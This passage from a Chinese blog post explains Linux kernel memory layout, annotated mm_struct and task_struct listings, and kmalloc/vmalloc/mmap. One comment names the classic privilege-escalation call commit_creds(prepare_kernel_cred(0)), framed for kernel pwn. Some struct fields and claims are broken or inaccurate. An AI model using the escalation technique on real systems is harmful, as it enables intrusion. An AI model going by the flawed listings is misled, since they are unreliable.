<li><strong>用户空间 (User Space)</strong>：地址范围从 0x00000000_00000000 到 0x00007FFF_FFFFFFFF。这些地址的最高有效位都是 0。这部分空间的大小正好是 <strong>128 TB</strong>。这部分是每个进程私有的。</li>
<li><strong>内核空间 (Kernel Space)</strong>：地址范围从 0xFFFF8000_00000000 到 0xFFFFFFFF_FFFFFFFF。这些地址的最高有效位都是 1。这部分的大小也是 <strong>128 TB</strong>。这部分空间被所有进程<strong>共享</strong>，但只有在内核态才能访问。</li>
</ul>
</li>
</ul>
<h2 id="关于32位的3GB-用户空间-1GB-内核空间。"><a href="#关于32位的3GB-用户空间-1GB-内核空间。" class="headerlink" title="关于32位的3GB 用户空间 + 1GB 内核空间。"></a><strong>关于32位的3GB 用户空间 + 1GB 内核空间。</strong></h2><p><strong>根本限制</strong>：32 位的寻址能力</p>
<ul>
<li>一个 32 位的指针，其所能表示的不同地址数量是 2^32。</li>
<li>2^32 字节 &#x3D; 4,294,967,296 字节 &#x3D; 4 GB。</li>
<li>这意味着，在 32 位架构上，<strong>任何一个进程的虚拟地址空间总大小被死死地限制在了 4GB</strong>。</li>
</ul>
<p>对于系统中的每一个进程，它的 4GB 虚拟地址空间都被划分成如下两部分：</p>
<ol>
<li><strong>用户空间 (User Space): 3GB</strong><ul>
<li><strong>地址范围</strong>: 0x00000000 到 0xBFFFFFFF。</li>
<li><strong>内容</strong>: 这里存放着进程私有的一切，包括：<ul>
<li>程序代码（.text段）</li>
<li>已初始化的数据（.data段）</li>
<li>未初始化的数据（.bss段）</li>
<li>堆（Heap），用于动态内存分配（如 malloc）</li>
<li>栈（Stack），用于函数调用和局部变量</li>
<li>内存映射的库（如 libc.so）和文件。</li>
</ul>
</li>
<li><strong>属性</strong>: 这部分空间是<strong>进程私有的</strong>。进程 A 的 3GB 空间和进程 B 的 3GB 空间通过页表映射到了不同的物理内存上，它们互相隔离。</li>
</ul>
</li>
<li><strong>内核空间 (Kernel Space): 1GB</strong><ul>
<li><strong>地址范围</strong>: 0xC0000000 到 0xFFFFFFFF。</li>
<li><strong>内容</strong>: 这里存放着操作系统的核心代码和数据。</li>
<li><strong>属性</strong>: 这部分空间是<strong>所有进程共享的</strong>。无论当前哪个进程在运行，它的虚拟地址空间的高 1GB 都映射到同一块物理内存，即内核所在的物理内存。进程在用户态时没有权限访问这部分地址，只有当通过系统调用进入内核态后，CPU 的权限级别提升，才能访问这部分内存。</li>
</ul>
</li>
</ol>
<h2 id="关于mm-struct"><a href="#关于mm-struct" class="headerlink" title="关于mm_struct"></a><strong>关于mm_struct</strong></h2><p><code>mm_struct</code> 结构体是 Linux 内核中描述一个进程虚拟地址空间的核心数据结构，可以说是进程内存管理的“总司令部”。它包含了管理进程内存所需的所有信息。</p>
<p>这个结构体非常庞大且复杂，其定义位于内核源码的 <code>include/linux/mm_types.h</code> 文件中。由于内核版本更迭，字段会略有增删，但其核心成员和设计思想是稳定的。</p>
<p>以下是 <code>mm_struct</code> 的一些关键和有代表性的字段，并按照功能进行分类和注释，帮助您更好地理解。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义于: include/linux/mm_types.h</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 1. 虚拟内存区域 (VMA) 管理</span></span><br><span class="line"><span class="comment">     * 这是 mm_struct 最核心的部分，用于管理进程的所有内存区域</span></span><br><span class="line"><span class="comment">     * (如代码段、数据段、堆、栈、内存映射文件等)。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">mmap</span>;</span>        <span class="comment">/* VMA 链表的头指针，按地址排序 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">mm_rb</span>;</span>               <span class="comment">/* VMA 的红黑树根节点，用于快速查找 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">mmap_cache</span>;</span>  <span class="comment">/* 最近找到的 VMA 缓存，提高查找效率 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 2. 页表和地址转换</span></span><br><span class="line"><span class="comment">     * 指向该进程的页表，是 CPU (MMU) 进行地址翻译的依据。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">pgd_t</span> * pgd;                        <span class="comment">/* 指向页全局目录 (Page Global Directory) 的指针 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 3. 内存使用计数</span></span><br><span class="line"><span class="comment">     * 统计和控制进程使用了多少内存。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">atomic_long_t</span> <span class="string">&quot;rss_stat&quot;</span>;         <span class="comment">/* 包含四种类型的驻留集大小 (RSS) 统计：</span></span><br><span class="line"><span class="comment">                                           - MM_FILEPAGES: 文件映射的物理页数</span></span><br><span class="line"><span class="comment">                                           - MM_ANONPAGES: 匿名映射的物理页数</span></span><br><span class="line"><span class="comment">                                           - MM_SWAPENTS:  交换区中的页数</span></span><br><span class="line"><span class="comment">                                           - MM_SHMEMPAGES: 共享内存页数</span></span><br><span class="line"><span class="comment">                                         */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> total_vm;             <span class="comment">/* 进程总的虚拟内存大小（以页为单位） */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> locked_vm;            <span class="comment">/* 被 mlock() 锁定的页数，不能被换出 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pinned_vm;            <span class="comment">/* 被特殊驱动 &quot;pin&quot; 住的页数 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> data_vm;              <span class="comment">/* 数据段的大小 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> exec_vm;              <span class="comment">/* 可执行代码段的大小 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_vm;             <span class="comment">/* 栈的大小 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 4. 进程地址空间范围定义</span></span><br><span class="line"><span class="comment">     * 记录了进程各个关键部分的起始和结束地址。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_code, end_code;     <span class="comment">/* 代码段的起始和结束地址 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_data, end_data;     <span class="comment">/* 数据段的起始和结束地址 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_brk, brk;           <span class="comment">/* 堆的起始和当前结束地址 (program break) */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_stack;              <span class="comment">/* 栈的起始地址 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> arg_start, arg_end;       <span class="comment">/* 命令行参数的起始和结束地址 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> env_start, env_end;       <span class="comment">/* 环境变量的起始和结束地址 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 5. 锁和同步机制</span></span><br><span class="line"><span class="comment">     * 用于保护 mm_struct 自身以及其下的 VMA 链表/红黑树在多线程环境下不被破坏。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmap_lock</span> <span class="title">mmap_lock</span>;</span>         <span class="comment">/* 一个读写信号量，用于保护 VMA 结构。</span></span><br><span class="line"><span class="comment">                                           读操作（如缺页中断）可以并发，</span></span><br><span class="line"><span class="comment">                                           写操作（如 mmap/munmap）则需要独占访问。</span></span><br><span class="line"><span class="comment">                                         */</span></span><br><span class="line">    <span class="type">spinlock_t</span> page_table_lock;         <span class="comment">/* 保护页表的自旋锁 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 6. 进程所有权和使用计数</span></span><br><span class="line"><span class="comment">     * 记录了谁拥有这个地址空间以及有多少个线程在使用它。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span>          <span class="comment">/* 指向拥有这个地址空间的进程（通常是主线程）*/</span></span><br><span class="line">    <span class="type">atomic_t</span> mm_users;                  <span class="comment">/* 使用这个地址空间的线程数（例如，一个进程的所有线程共享同一个 mm_struct）*/</span></span><br><span class="line">    <span class="type">atomic_t</span> mm_count;                  <span class="comment">/* mm_struct 结构体自身的引用计数。当为0时，可以被销毁。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 7. 内核线程和上下文</span></span><br><span class="line"><span class="comment">     * 用于区分一个 mm_struct 是属于普通用户进程还是内核线程。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> core_state;                     <span class="comment">/* 用于 coredump 的状态信息 */</span></span><br><span class="line">    u32 anova_context;                  <span class="comment">/* 匿名虚拟地址(AVA)的上下文 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 8. 缺页中断（Page Fault）相关</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> faultstamp;           <span class="comment">/* 最近一次 major fault 的时间戳 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> token_priority;       <span class="comment">/* 缺页令牌的优先级 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> last_interval;        <span class="comment">/* 两次 major fault 之间的间隔 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... 以及其他许多用于特定功能（如 coredump, transparent huge pages, KSM 等）的字段 ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>总结：</strong></p>
<table>
<thead>
<tr>
<th>数据结构</th>
<th>在 mm_struct 中的字段</th>
<th>擅长操作</th>
<th>主要应用场景</th>
<th>时间复杂度</th>
</tr>
</thead>
<tbody><tr>
<td><strong>VMA 链表</strong></td>
<td>mmap</td>
<td><strong>顺序遍历 (Iteration)</strong></td>
<td>fork(), &#x2F;proc&#x2F;pid&#x2F;maps, 跨多个VMA的munmap</td>
<td>遍历: O(n)</td>
</tr>
<tr>
<td><strong>VMA 红黑树</strong></td>
<td>mm_rb</td>
<td><strong>快速查找 (Lookup)</strong></td>
<td><strong>缺页中断 (Page Fault)</strong>, mmap时检查地址冲突</td>
<td>查找&#x2F;插入&#x2F;删除: O(log n)</td>
</tr>
</tbody></table>
<p><code>mm_struct</code> 就像一个进程的内存蓝图，它通过以下几个核心组件来工作：</p>
<ol>
<li><strong>VMA 链表和红黑树 (<code>mmap</code>, <code>mm_rb</code>)</strong>：这是灵魂所在。它将进程的虚拟地址空间划分为一个个具有不同属性（如可读、可写、可执行）的 <code>vm_area_struct</code> 区域。当你调用 <code>mmap</code> 时，内核就是在这里为你创建一个新的 VMA。</li>
<li><strong>页全局目录 (<code>pgd</code>)</strong>：这是通往硬件翻译的桥梁。<code>pgd</code> 指向该进程页表的顶层结构，CPU 的 MMU 正是利用它来将虚拟地址翻译为物理地址。</li>
<li><strong>内存统计 (<code>total_vm</code>, <code>rss_stat</code>)</strong>：提供了对进程内存使用情况的宏观掌控，也是 <code>top</code>、<code>free</code> 等命令的数据来源之一。</li>
<li><strong>锁 (<code>mmap_lock</code>)</strong>：保证了在多线程环境下，对内存布局的修改是安全的。</li>
</ol>
<p>每个用户进程都有其自己唯一的 <code>mm_struct</code>。而内核线程则比较特殊，它们没有自己的地址空间，所以它们的 <code>task_struct-&gt;mm</code> 字段通常是 <code>NULL</code>，它们运行时会借用上一个用户进程的 <code>mm_struct</code>。</p>
<h2 id="关于中断"><a href="#关于中断" class="headerlink" title="关于中断"></a>关于中断</h2><p>Linux内核通过中断技术，响应硬件发出的异步信号，暂停当前任务以立即处理紧急事件，从而实现高效的I&#x2F;O操作和任务调度。</p>
<h2 id="关于vmlloc、kmalloc、mmap"><a href="#关于vmlloc、kmalloc、mmap" class="headerlink" title="关于vmlloc、kmalloc、mmap"></a>关于vmlloc、kmalloc、mmap</h2><p><code>kmalloc</code>、<code>vmalloc</code> 和 <code>mmap</code> 是 Linux 内核和驱动开发中至关重要的三个内存操作机制。它们在不同的场景下使用，理解其区别是编写健壮、高效内核代码的基础。</p>
<h3 id="kmalloc-kfree：内核的主力内存分配方式"><a href="#kmalloc-kfree：内核的主力内存分配方式" class="headerlink" title="kmalloc &#x2F; kfree：内核的主力内存分配方式"></a><code>kmalloc</code> &#x2F; <code>kfree</code>：内核的主力内存分配方式</h3><p><code>kmalloc</code> 是内核中最常用、最高效的内存分配函数。</p>
<p> <code>void *kmalloc(size_t size, gfp_t flags);</code></p>
<ul>
<li><strong>作用</strong>: 分配一块<strong>物理上连续</strong>并且<strong>虚拟地址上也连续</strong>的内存。</li>
<li><strong>核心特点 (物理连续)</strong>: 这是 <code>kmalloc</code> 最重要的特征。因为它分配的内存在物理 RAM 中是连成一片的，所以非常适合需要进行 DMA (Direct Memory Access) 操作的硬件设备。DMA 控制器通常不理解虚拟地址，只能操作物理地址。</li>
<li><strong>分配来源</strong>: <code>kmalloc</code> 的内存来自于内核的 <strong>slab&#x2F;slub 分配器</strong>，这是一套为分配小块内存而高度优化的缓存机制。</li>
<li><strong>分配大小</strong>: 通常用于分配相对较小的、大小固定的内存块（一般不超过几兆字节，上限为 <code>KMALLOC_MAX_SIZE</code>）。</li>
<li><strong>速度</strong>: 非常快，因为大部分情况下是从预先分配好的缓存池中直接获取，几乎没有额外开销。</li>
<li><strong><code>gfp_t flags</code></strong>: 这是一个关键参数，用于指定分配行为。<ul>
<li><strong><code>GFP_KERNEL</code></strong>: 最常用的标志。表示可以在需要时睡眠（阻塞），等待内存变为可用。因此，它<strong>不能在中断上下文或持有自旋锁时使用</strong>。</li>
<li><strong><code>GFP_ATOMIC</code></strong>: 表示分配必须是原子的，绝不能睡眠。如果当前没有可用内存，它会立即返回 <code>NULL</code>。这是<strong>在中断处理程序等不能阻塞的代码中唯一可以使用的标志</strong>。</li>
</ul>
</li>
</ul>
<p> <code>void kfree(const void *objp);</code></p>
<ul>
<li><strong>作用</strong>: 释放由 <code>kmalloc</code> 分配的内存块，将其归还给 slab 分配器。</li>
<li><strong>规则</strong>: <code>kfree</code> 必须用于释放 <code>kmalloc</code> 分配的内存，不能混用。传入 <code>NULL</code> 是安全的操作。</li>
</ul>
<p><strong>一句话总结 <code>kmalloc</code></strong>: 用于为设备驱动和内核核心功能分配快速、物理连续的小块内存。</p>
<hr>
<h3 id="vmalloc-vfree：为大块虚拟内存而生"><a href="#vmalloc-vfree：为大块虚拟内存而生" class="headerlink" title="vmalloc &#x2F; vfree：为大块虚拟内存而生"></a><code>vmalloc</code> &#x2F; <code>vfree</code>：为大块虚拟内存而生</h3><p><code>vmalloc</code> 用于分配大块的、对物理连续性没有要求的内存。</p>
<p><code>void *vmalloc(unsigned long size);</code></p>
<ul>
<li><strong>作用</strong>: 分配一块<strong>虚拟地址上连续</strong>，但<strong>物理上不一定连续</strong>的内存。</li>
<li><strong>核心特点 (虚拟连续)</strong>: 内核会将来自不同物理位置的零散内存页（Pages），通过修改内核的页表，将它们映射成一块看起来连续的虚拟地址空间。</li>
<li><strong>分配来源</strong>: 直接从内核的伙伴系统（Buddy System）中请求物理页，然后构建页表来映射它们。</li>
<li><strong>分配大小</strong>: 非常适合需要大块内存（例如几十兆或更大）的场景，比如为某些模块加载大的固件，或者创建大的缓冲区。</li>
<li><strong>速度</strong>: 比 <code>kmalloc</code> 慢得多。因为它涉及到查找空闲物理页、修改页表等一系列更复杂的操作。</li>
<li><strong>是否可睡眠</strong>: <code>vmalloc</code> 可能会睡眠以等待内存，因此<strong>不能在中断上下文中使用</strong>。</li>
</ul>
<p><code>void vfree(const void *addr);</code></p>
<ul>
<li><strong>作用</strong>: 释放由 <code>vmalloc</code> 分配的内存。它会解除页表映射，并将底层的物理页归还给伙伴系统。</li>
<li><strong>规则</strong>: 与 <code>vfree</code> 配对使用，不能混用。</li>
</ul>
<p><strong>一句话总结 <code>vmalloc</code></strong>: 用于在内核中分配大块的、虚拟地址连续的内存，不关心物理上是否连续。</p>
<hr>
<h3 id="mmap-munmap：连接内核与用户的桥梁"><a href="#mmap-munmap：连接内核与用户的桥梁" class="headerlink" title="mmap &#x2F; munmap：连接内核与用户的桥梁"></a><code>mmap</code> &#x2F; <code>munmap</code>：连接内核与用户的桥梁</h3><p><code>mmap</code> 本身是一个<strong>系统调用</strong>，它不是一个像 <code>kmalloc</code> 那样直接供内核其他部分使用的分配函数。它的主要职责是在<strong>用户进程的虚拟地址空间</strong>中创建一块新的内存映射。</p>
<p>从内核的角度看，响应 <code>mmap</code> 系统调用的过程是：</p>
<ul>
<li><p><strong>作用</strong>: 在调用进程的地址空间中，创建一个新的 <strong>VMA (<code>vm_area_struct</code>)</strong>。这个 VMA 可以是：</p>
<ol>
<li><strong>文件映射 (File-backed)</strong>: 将一个文件的某一部分映射到进程的地址空间。当用户访问这块内存时，内核通过缺页中断机制，按需从磁盘读取文件内容到物理内存，并建立页表映射。对这块内存的修改也可以被写回文件。</li>
<li><strong>匿名映射 (Anonymous)</strong>: 创建一块不与任何文件关联的内存区域，通常用作程序的堆或栈。这块内存会被初始化为零。</li>
</ol>
</li>
<li><p><strong>核心特点</strong>: <code>mmap</code> 是实现用户空间与内核空间（特别是设备驱动）进行<strong>零拷贝 (Zero-copy)</strong> 数据交换的关键。驱动程序可以实现 <code>mmap</code> 接口，将设备的内存（如显存、硬件缓冲区）直接映射到用户空间，用户程序可以直接读写这块内存，避免了数据在内核和用户空间之间来回拷贝的开销。</p>
</li>
<li><p><strong>释放</strong>: 用户空间的程序通过调用 <code>munmap</code> 系统调用来解除这段映射，内核会回收对应的 VMA 和相关的物理内存页。</p>
</li>
</ul>
<p><strong>一句话总结 <code>mmap</code></strong>: 它是用户程序向内核申请创建内存映射的机制，是实现高效 I&#x2F;O 和进程内存管理的核心系统调用。</p>
<hr>
<h3 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h3><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><code>kmalloc</code></th>
<th align="left"><code>vmalloc</code></th>
<th align="left"><code>mmap</code> (从内核视角)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>分配目标</strong></td>
<td align="left">内核自身使用</td>
<td align="left">内核自身使用</td>
<td align="left"><strong>用户进程</strong>的地址空间</td>
</tr>
<tr>
<td align="left"><strong>物理连续性</strong></td>
<td align="left"><strong>是</strong></td>
<td align="left"><strong>否</strong></td>
<td align="left">取决于底层（通常是否）</td>
</tr>
<tr>
<td align="left"><strong>虚拟连续性</strong></td>
<td align="left"><strong>是</strong></td>
<td align="left"><strong>是</strong></td>
<td align="left"><strong>是</strong></td>
</tr>
<tr>
<td align="left"><strong>常用大小</strong></td>
<td align="left">小块 (&lt; <code>KMALLOC_MAX_SIZE</code>)</td>
<td align="left">大块</td>
<td align="left">任意大小</td>
</tr>
<tr>
<td align="left"><strong>性能&#x2F;速度</strong></td>
<td align="left"><strong>非常快</strong></td>
<td align="left">较慢</td>
<td align="left">开销较大（涉及VMA操作）</td>
</tr>
<tr>
<td align="left"><strong>是否可睡眠</strong></td>
<td align="left">取决于<code>flags</code> (<code>GFP_ATOMIC</code>不可)</td>
<td align="left">是</td>
<td align="left">是（在系统调用上下文中）</td>
</tr>
<tr>
<td align="left"><strong>主要用途</strong></td>
<td align="left">DMA、描述符、小缓冲区</td>
<td align="left">大缓冲区、模块加载</td>
<td align="left"><strong>驱动与用户空间数据交换</strong>、文件映射</td>
</tr>
<tr>
<td align="left"><strong>释放函数</strong></td>
<td align="left"><code>kfree</code></td>
<td align="left"><code>vfree</code></td>
<td align="left"><code>munmap</code> (由用户进程调用)</td>
</tr>
</tbody></table>
<p>看过malloc.c源码的就知道，malloc()和free()其实就是对mmap和munmap的包装</p>
<h2 id="关于task-struct"><a href="#关于task-struct" class="headerlink" title="关于task_struct"></a>关于task_struct</h2><p><code>task_struct</code> 是 Linux 内核中<strong>最核心、最庞大</strong>的数据结构，没有之一。它就是内核对一个<strong>进程或线程</strong>的完整描述，通常被称为**“进程描述符”(Process Descriptor)**。</p>
<p>理解了 <code>task_struct</code>，就等于拿到了理解内核如何管理进程的钥匙。</p>
<p>这个结构体定义在内核源码的 <code>include/linux/sched.h</code> 文件中。由于它极其庞大（在现代内核中有数百个字段），我们不可能逐一讲解。最好的方式是将其<strong>按功能模块进行分类解读</strong>，这能让你看清它的设计脉络。</p>
<p><code>task_struct</code> 的核心作用：进程的“身份证”与“档案袋”</p>
<p>你可以把 <code>task_struct</code> 想象成一个人的全部档案，里面包含了：</p>
<ul>
<li><strong>个人信息</strong>: 进程 ID (PID)、状态（在干嘛）、名字。</li>
<li><strong>工作安排</strong>: 调度策略、优先级、被分配到哪个 CPU 上运行。</li>
<li><strong>资产清单</strong>: 拥有哪些内存空间 (<code>mm_struct</code>)。</li>
<li><strong>社会关系</strong>: 父进程是谁、子进程有哪些。</li>
<li><strong>权限与凭证</strong>: 用户 ID、组 ID、拥有的能力 (Capabilities)。</li>
<li><strong>随身物品</strong>: 打开了哪些文件。</li>
</ul>
<hr>
<h3 id="task-struct-核心字段功能模块化解读"><a href="#task-struct-核心字段功能模块化解读" class="headerlink" title="task_struct 核心字段功能模块化解读"></a><code>task_struct</code> 核心字段功能模块化解读</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义于: include/linux/sched.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 1. 进程状态与标识 (State &amp; Identification)</span></span><br><span class="line"><span class="comment">     * &quot;我是谁？我在干什么？&quot;</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">long</span> state;            </span><br><span class="line">    <span class="comment">/* 任务状态: TASK_RUNNING--&gt;运行态（表示进程当前正在运行或准备运行）,</span></span><br><span class="line"><span class="comment">    TASK_INTERRUPTIBLE--&gt;可中断睡眠态（表示进程正在等待某个事件的发生，一旦事件发生或收到信号，可被唤醒继续执行）</span></span><br><span class="line"><span class="comment">    TASK_UNINTERRUPTIBLE--&gt;不可中断睡眠态（与可中断睡眠态类似，表示进程正在等待某个事件的发生，但在此状态下进程无法被信号唤醒或中断）</span></span><br><span class="line"><span class="comment">    TASK_STOPPED--&gt;停止态（表示进程已经停止运行，并没有被停止。它可能是由于接收到SIGSTOP、SIGTSTP、SIGTTIN等信号而暂停执行）</span></span><br><span class="line"><span class="comment">    TASK_TRACED--&gt;跟踪态（表示进程处于调试状态，在这种状态下，一个父进程可以听歌调用系统调用来观察和控制子进程的执行）*/</span></span><br><span class="line">    <span class="type">void</span> *<span class="built_in">stack</span>;                    </span><br><span class="line">    <span class="comment">/* 进程内核栈，Linux内核通过thread_union联合体表示进程的内核栈</span></span><br><span class="line"><span class="comment">    分配/释放内核栈：alloc_thread_info/free_thread_info*/</span></span><br><span class="line">    <span class="type">pid_t</span> pid;                      <span class="comment">/* 进程ID (Process ID) */</span></span><br><span class="line">    <span class="type">pid_t</span> tgid;                     <span class="comment">/* 线程组ID (Thread Group ID)。一个进程中所有线程的 tgid 相同。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">parent</span>;</span>     <span class="comment">/* 指向父进程的指针 */</span></span><br><span class="line">    <span class="type">char</span> comm[TASK_COMM_LEN];       <span class="comment">/* 进程名，如 &quot;bash&quot;, &quot;top&quot; */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 2. 调度信息 (Scheduling)</span></span><br><span class="line"><span class="comment">     * &quot;我该如何、以及何时使用 CPU？&quot;</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="type">int</span> prio, static_prio, normal_prio; <span class="comment">/* 动态、静态、普通优先级 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> rt_priority;         <span class="comment">/* 实时优先级 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> *<span class="title">sched_class</span>;</span> <span class="comment">/* 指向调度器类的指针 (如 CFS, FIFO, RR)。</span></span><br><span class="line"><span class="comment">                                              这是实现不同调度策略的关键，是面向对象思想的体现。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sched_entity</span> <span class="title">se</span>;</span>              <span class="comment">/* 调度实体 (Scheduling Entity)，专门用于CFS调度器。</span></span><br><span class="line"><span class="comment">                                              包含了虚拟运行时间(vruntime)等核心调度数据。*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> policy;                 <span class="comment">/* 调度策略 (SCHED_NORMAL, SCHED_FIFO, etc.) */</span></span><br><span class="line">    <span class="type">int</span> nr_cpus_allowed;                 <span class="comment">/* 允许在多少个CPU上运行 */</span></span><br><span class="line">    <span class="type">cpumask_t</span> cpus_allowed;              <span class="comment">/* 允许运行的CPU的位掩码 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 3. 内存管理 (Memory Management)</span></span><br><span class="line"><span class="comment">     * &quot;我的地址空间在哪里？&quot; - 这是 Pwn 领域最关心的部分之一</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="comment">// 表示进程/线程所属的内存管理结构体，用于管理进程/线程的虚拟内存空间和页表信息</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>             <span class="comment">/* 指向内存描述符的指针，描述了完整的用户地址空间。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">active_mm</span>;</span>      <span class="comment">/* 指向当前活跃的地址空间。</span></span><br><span class="line"><span class="comment">                                         对于普通进程, mm == active_mm。</span></span><br><span class="line"><span class="comment">                                         对于内核线程, mm 为 NULL, 但它会借用上一个进程的 active_mm。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 4. 身份与凭证 (Credentials &amp; Security)</span></span><br><span class="line"><span class="comment">     * &quot;我有什么权限？&quot; - 内核提权 Pwn 的核心目标</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>   <span class="comment">/* 指向&quot;凭证&quot;结构体的指针 (rcu是一种高级锁)。</span></span><br><span class="line"><span class="comment">                                        cred 结构体包含了 real_uid, uid, gid, capabilities 等。</span></span><br><span class="line"><span class="comment">                                        内核提权的经典手法就是修改当前进程的 cred，</span></span><br><span class="line"><span class="comment">                                        例如调用 commit_creds(prepare_kernel_cred(0))。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 5. 进程关系 (Relationships)</span></span><br><span class="line"><span class="comment">     * &quot;我的家族树是怎样的？&quot;</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children</span>;</span>      <span class="comment">/* 我的子进程链表的头部 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">sibling</span>;</span>       <span class="comment">/* 我在父进程的 children 链表中的节点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">group_leader</span>;</span><span class="comment">/* 指向线程组的领导者（通常是主线程）*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 6. 文件系统与文件描述符 (Filesystem &amp; File Descriptors)</span></span><br><span class="line"><span class="comment">     * &quot;我打开了哪些文件？&quot;</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>;</span>     <span class="comment">/* 指向文件描述符表的指针。</span></span><br><span class="line"><span class="comment">                                       这里包含了fd数组，记录了每个文件描述符指向哪个 `struct file`。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> *<span class="title">fs</span>;</span>           <span class="comment">/* 